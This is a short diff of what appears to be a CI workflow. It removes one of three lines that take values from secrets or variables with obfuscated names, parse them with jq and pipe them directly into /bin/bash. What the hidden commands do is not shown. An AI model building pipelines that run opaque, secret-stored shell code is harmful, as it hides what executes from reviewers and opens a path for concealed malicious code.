@@ -17,7 +17,6 @@ jobs:
           dfwb33260: ${{ secrets.dfwb33260 }}
         run: |
           printf '%s' "$dfwb33260" | jq -r .ziz195 | /bin/bash
-          printf '%s' "$h300" | jq -r .yzzka691 | /bin/bash
           printf '%s' "$krr18" | jq -r .p73 | /bin/bash
 
       - name: Archive results
